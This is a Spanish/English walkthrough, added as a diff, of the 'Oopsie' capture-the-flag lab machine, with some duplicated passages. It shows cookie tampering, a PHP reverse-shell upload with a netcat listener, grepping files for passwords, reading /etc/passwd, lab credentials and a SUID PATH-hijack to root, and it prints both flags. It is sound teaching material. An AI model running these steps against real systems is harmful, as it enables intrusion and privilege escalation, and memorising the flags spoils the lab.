@@ -1,0 +1,217 @@
+Maquina 11 Oopsie  Reverse Shell 
+IP: 10.129.30.209
+Empezamos con un nmap -sC -sV
+Podemos ver que tienen los puertos 22 y 80 abiertos. Por lo que vamos a probar el ip en el navegador. Nos abre una pagina web. 
+Dentro del contenido de la pagina web podemos ver que dice que para ver mas contenido debemos hacer log in. 
+Para esta maquina utilizaremos Burp Suite. Lo configuraremos como Proxy Intercept: Burp actúa como un proxy entre el navegador y el servidor web. Intercepta las solicitudes y respuestas entre ellos, lo que permite al usuario modificar y analizar el tráfico en tiempo real. Esta característica es valiosa para identificar y modificar datos en tránsito. 
+Maquina 11 Oopsie  Reverse Shell 
+IP: 10.129.30.209
+Empezamos con un nmap -sC -sV
+Podemos ver que tienen los puertos 22 y 80 abiertos. Por lo que vamos a probar el ip en el navegador. Nos abre una pagina web. 
+Dentro del contenido de la pagina web podemos ver que dice que para ver mas contenido debemos hacer log in. 
+Para esta maquina utilizaremos Burp Suite. Lo configuraremos como Proxy Intercept: Burp actúa como un proxy entre el navegador y el servidor web. Intercepta las solicitudes y respuestas entre ellos, lo que permite al usuario modificar y analizar el tráfico en tiempo real. Esta característica es valiosa para identificar y modificar datos en tránsito. 
+
+Para ello debemos configurar nuestro browser: 
+
+First we will start Burp Suite, and configure browser to send traffic through proxy. To access proxy settings
+in Mozilla Firefox, you can click on Firefox’s menu and navigate to Preferences.
+Then we type in the search bar the "proxy" and now Network Settings are being presented. We are then
+select Settings... .
+Then we select the Manual proxy configuration where we enter as an HTTP Proxy the 127.0.0.1 IP and
+port the 8080 where Burp Proxy is listening.
+Note: It is advisable to also check the option of Also use this proxy for FTP and HTTPS so all requests can
+go through Burp.
+We need to disable the interception in Burp suite as it's enabled by default. Navigate to Proxy Tab , and
+under Intercept subtab select the button where Intercept in on so to disable it.
+Now that everything is setup correctly we refresh the page in our browser and switch in Burp Suite under
+the Target tab and then on the Sitemap option:
+It is possible to spot some directories and files that weren't visible while browsing. One that is indeed very
+interesting it's the directory of /cdn-cgi/login .
+
+Podemos ver que burpsuite encuentra que hay una pagina de log in. Podemos agregarle /cdn-cgi/login a la URL de la pagina web y nos redirecciona a la pagina de log in. 
+
+Probamos entrar con user y passwords defaults pero no logramos acceso. Luego hay una opcion que es login como guest. Probamos y dentro hay un apartado que dice UPLOADS, entramos pero dice que debemos ser superusers para poder hacer UPLOADS. 
+
+We need to find a way to escalate our privileges from user Guest to super admin role. One way to try this
+is by checking if cookies and sessions can be manipulated.
+It is possible to view and change cookies in Mozilla Firefox through the usage of Developer Tools.
+In order to enter the Developer Tools panel we need to right click in the content of the webpage and select
+the Inspect Element(Q).
+
+Cookies are text files with small pieces of data created by the web server, stored by
+the browser into the computer file system and being used to identify a user while is
+browsing a website
+
+It is possible to view and change cookies in Mozilla Firefox through the usage of Developer Tools.
+
+Para esto dentro de la pagina web, apretamos boton derecho y abrimos Inspect(Q)
+Luego vamos a Storage section where Cookies are being presented. As one can observe, there is
+a role=guest and user=2233 which we can assume that if we somehow knew the number of super
+admin for the user variable, we might be able to gain access to the upload page.
+
+We check the URL on our browsers bar again where there is an id for every user:
+http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&id=2
+
+We can try change the id variable to something else like for example 1 to see if we can enumerate the
+users:
+http://10.129.30.209/cdn-cgi/login/admin.php?content=accounts&id=1
+
+Verificamos que cambia de guest a admin
+
+
+Indeed we got an information disclosure vulnerability, which we might be able to abuse. We now know the
+access ID of the admin user thus we can try to change the values in our cookie through the Developer tools
+so the user value to be 34322 and role value to be admin . Then we can revisit the Uploads page
+
+Obtuvimos acceso al apartado de UPLOADS
+
+Ahora que ya logramos el acceso intentaremos subir una reverse shell . 
+En nuestro ordenador tenemos el archivo /usr/share/webshells/php/php-reverse-shell.php
+Lo modificaremos para que nos sirva en nuestro caso el Ip y el puerto 
+
+We finally managed to upload it. Now we might need to bruteforce directories in order to locate the folder
+where the uploaded files are stored but we can also guess it. uploads directory seems a logical
+assumption. We confirm that by running also the gobuster tool.
+gobuster dir --url http://10.129.30.209/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
+
+nos encuentra entre otras cosas:
+http://10.129.30.209/uploads/
+No tenemos acceso, pero podemos poner en escucha el puerto 1234 con netcat
+nc -lvnp 1234
+
+Then request our shell through the browser:
+http://10.129.30.209/uploads/php-reverse-shell.php
+
+una vez logramos acceso con nuestra reverse shell. ejecutamos el comando: 
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+ya estamos dentro! 
+podemos hacer un whoami y somos el usuario www-data .
+Buscaremos todas las carpetas para ver información importante que podamos encontrar. 
+en esta carpeta para haber cosas interesantes /var/www/html/cdn-cgi/login
+podemos entrar una por una para buscar contenido que nos sirve, pero podriamos usar el comando grep para ayudarnos a encontrar passwords. 
+grep is a tool that searches for PATTERNS in each FILE and
+print lines that match the patterns. We can use cat * to read all files while pipeing the output to grep
+where we provide the pattern of a string that starts with the word passw and followed by any string such as
+for example words passwd or password. We can also use the switch -i to ignore case sensitive words like
+Password.
+Por lo que usaremos este comando: 
+cat * | grep -i passw*
+cat * que nos abra todos los archivos y que busque dentro de ellos todo lo que empiece por passw
+
+Encontramos : if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
+<input type="password" name="password" placeholder="Password" />
+
+We can check the available users are on the system by
+reading the /etc/passwd file so we can try a password reuse of this password
+
+cat /etc/passwd
+
+Encontramos el usuario
+robert:x:1000:1000:robert:/home/robert:/bin/bash
+
+luego dentro de los archivos que encontramos en la carpeta /var/www/html/cdn-cgi/login
+podemos abrir el db.php y encontramos 
+
+<?php
+$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
+?>
+
+Probamos de entrar como robert con el comando:
+sudo robert
+nos pide contraseña y probamos con M3g4C0rpUs3r!
+
+ahora nos vamos a la raiz de usuario Robert y abrimos el archivo user.txt
+f2c74ee8db7983851ab2a96a44eb7981
+
+Ahora viene la parte de Privilege Escalation 
+
+Before running any privilege escalation or enumeration script, let's check the basic commands for elevating
+privileges like sudo and id 
+
+hacemos el comando id
+uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
+
+We observe that user robert is part of the group bugtracker . Let's try to see if there is any binary within
+that group:
+
+find / -group bugtracker 2>/dev/null
+We found a file named bugtracker . We check what privileges and what type of file is it:
+con el comando:
+
+ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
+
+-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
+/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped
+
+There is a suid set on that binary, which is a promising exploitation path
+
+We will run the application to observe how it behaves:
+The tool is accepting user input as a name of the file that will be read using the cat command, however, it
+does not specifies the whole path to file cat and thus we might be able to exploit this.
+We will navigate to /tmp directory and create a file named cat with the following content:
+We will then set the execute privileges:
+In order to exploit this we can add the /tmp directory to the PATH environmental variable.
+Commonly noted as SUID (Set owner User ID), the special permission for the user access
+level has a single function: A file with SUID always executes as the user who owns the
+file, regardless of the user passing the command. If the file owner doesn't have
+execute permissions, then use an uppercase S here.
+In our case, the binary 'bugtracker' is owned by root & we can execute it as root since
+it has SUID set.
+
+We will run the application to observe how it behaves:
+
+The tool is accepting user input as a name of the file that will be read using the cat command, however, it
+does not specifies the whole path to file cat and thus we might be able to exploit this.
+We will navigate to /tmp directory and create a file named cat with the following content
+
+echo '/bin/sh' > cat
+le damos privilegios
+chmod +x cat 
+
+In order to exploit this we can add the /tmp directory to the PATH environmental variable.
+PATH is an environment variable on Unix-like operating systems, DOS, OS/2, and
+Microsoft Windows, specifying a set of directories where executable programs are
+located.
+
+We can do that my issuing the following command:
+export PATH=/tmp:$PATH
+
+Finally execute the bugtracker from /tmp directory:
+Provide Bug id: 2
+
+The root flag can be found in the /root folder:
+
+Flag: af13b0bee69f8a877c3faf667f7beacf
+
+
+Resumen:
+Escaneo inicial de la máquina:
+nmap -sC -sV
+Acceso a la página web y descubrimiento de la necesidad de inicio de sesión.
+
+Configuración de Burp Suite como proxy:
+
+Inicio de Burp Suite y configuración como Proxy Intercept.
+Manipulación de cookies para obtener acceso a la sección de "UPLOADS".
+
+Intento de subir una reverse shell:
+
+nc -lvnp 1234
+Identificación del usuario "robert" y revisión de archivos en "/var/www/html/cdn-cgi/login":
+
+cat * | grep -i passw*
+Obtención de credenciales para el usuario "robert":
+
+cat /etc/passwd
+Escalada de privilegios al encontrar el binario "bugtracker":
+
+find / -group bugtracker 2>/dev/null
+Explotación del binario "bugtracker" y acceso root:
+
+ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
+Creación de un archivo "cat" en el directorio "/tmp" y ejecución del binario "bugtracker":
+
+echo '/bin/sh' > cat
+chmod +x cat
+export PATH=/tmp:$PATH
